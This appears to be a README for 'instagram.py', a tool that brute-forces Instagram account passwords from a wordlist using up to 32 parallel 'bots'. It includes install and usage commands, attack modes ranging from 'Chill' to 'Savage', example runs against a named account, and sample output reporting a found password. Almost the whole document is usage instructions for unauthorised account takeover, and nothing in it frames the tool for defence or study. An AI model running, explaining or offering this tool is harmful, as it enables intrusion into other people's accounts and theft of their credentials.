Install Dependencies
pip3 install -r requirements.txt
Help
python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
Usage
python3 instagram.py <username> <wordlist> -m <mode>
Bots(Threads)
4 bots: 64 passwords at a time
8 bots: 128 passwords at a time
16 bots: 256 passwords at a time
32 bots: 512 passwords at a time
Modes
0: 32 bots
1: 16 bots
2: 8 bots
3: 4 bots
Chill mode
This mode uses only 4 bots, or 64 passwords at a time.

python3 instagram.py lachin_a pass.lst -m 3
Moderate mode 1
This mode uses 8 bots, or 128 passwords at a time.

python3 instagram.py lachin_a pass.lst -m 2
Moderate mode 2
This mode uses 16 bots, or 256 passwords at a time.

python3 instagram.py lachin_a pass.lst -m 1
Savage mode
This mode uses 32 bots, or 512 passwords at a time.

python3 instagram.py lachin_a pass.lst -m 0
If you don't specify a mode, then mode is set to 2
Run
[-] Wordlist: pass.lst
[-] Username: lachin_a
[-] Password: lachin222
[-] Complete: 45.51%
[-] Attempts: 123
[-] Browsers: 68
[-] Exists: True
Stop
[-] Wordlist: pass.lst
[-] Username: lachin_a
[-] Password: lachin1234
[-] Complete: 62.67%
[-] Attempts: 30
[-] Browsers: 35
[-] Exists: True

[!] Password Found
[+] Username: lachin_a  
[+] Password: lachin123456
......................................
